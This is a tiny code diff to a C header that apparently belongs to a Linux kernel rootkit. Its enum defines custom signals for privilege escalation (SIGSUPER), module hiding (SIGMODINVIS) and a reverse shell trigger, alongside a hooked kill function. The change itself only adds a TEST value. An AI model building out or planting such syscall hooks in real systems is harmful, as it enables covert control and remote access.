@@ -3,6 +3,7 @@ enum {
     SIGSUPER = 64,
     SIGMODINVIS = 63,
     SIGNAL_REVERSE_SHELL = 60,
+    TEST = 30,
 };
 
 int new_kill(const struct pt_regs *pt_regs);
